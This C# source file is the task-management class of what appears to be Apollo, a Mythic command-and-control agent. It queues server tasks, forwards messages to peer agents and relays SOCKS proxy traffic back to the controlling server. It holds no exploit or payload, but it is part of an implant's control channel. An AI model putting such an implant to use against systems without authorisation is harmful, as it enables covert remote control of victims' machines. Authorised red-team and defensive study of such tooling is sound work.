using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Collections.Concurrent;
using ApolloInterop.Interfaces;
using ApolloInterop.Types.Delegates;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Enums.ApolloEnums;

namespace Apollo.Management.Tasks
{
    public class TaskManager : ITaskManager
    {
        protected IAgent Agent;


        private ConcurrentQueue<TaskResponse> TaskResponseQueue = new ConcurrentQueue<TaskResponse>();

        private ConcurrentQueue<DelegateMessage> DelegateMessages = new ConcurrentQueue<DelegateMessage>();

        private Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>> SocksDatagramQueue = new Dictionary<MessageDirection, ConcurrentQueue<SocksDatagram>>()
        {
            { MessageDirection.ToMythic, new ConcurrentQueue<SocksDatagram>() },
            { MessageDirection.FromMythic, new ConcurrentQueue<SocksDatagram>() }
        };


        private ConcurrentQueue<Task> TaskQueue = new ConcurrentQueue<Task>();
        private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();


        public TaskManager(IAgent agent)
        {
            Agent = agent;
        }

        
        public void AddTaskResponseToQueue(TaskResponse message)
        {
            TaskResponseQueue.Enqueue(message);
        }

        public void AddDelegateMessageToQueue(DelegateMessage delegateMessage)
        {
            DelegateMessages.Enqueue(delegateMessage);
        }

        public void AddSocksDatagramToQueue(MessageDirection direction, SocksDatagram dg)
        {
            SocksDatagramQueue[direction].Enqueue(dg);
        }


        public bool ProcessMessageResponse(MessageResponse resp)
        {
            foreach(Task t in resp.Tasks)
            {
                TaskQueue.Enqueue(t);
            }

            foreach(TaskStatus t in resp.Responses)
            {
                TaskStatusQueue.Enqueue(t);
            }

            foreach(DelegateMessage d in resp.Delegates)
            {
                Agent.GetPeerManager().Route(d);
            }
            return true;
        }

        public bool CreateTaskingMessage(OnResponse<TaskingMessage> onResponse)
        {
            // We should pop messages from the task manager and stuff them into
            // this message here.

            List<TaskResponse> responses = new List<TaskResponse>();
            List<DelegateMessage> delegates = new List<DelegateMessage>();
            List<SocksDatagram> dgs = new List<SocksDatagram>();

            while(TaskResponseQueue.TryDequeue(out TaskResponse res))
            {
                responses.Add(res);
            }

            while(DelegateMessages.TryDequeue(out var res))
            {
                delegates.Add(res);
            }

            while(SocksDatagramQueue[MessageDirection.ToMythic].TryDequeue(out var dg))
            {
                dgs.Add(dg);
            }

            TaskingMessage msg = new TaskingMessage()
            {
                Action = MessageAction.GetTasking.ToString(),
                TaskingSize = -1,
                Delegates = delegates.ToArray(),
                Responses = responses.ToArray(),
                Socks = dgs.ToArray()
            };
            return onResponse(msg);
        }
    }
}
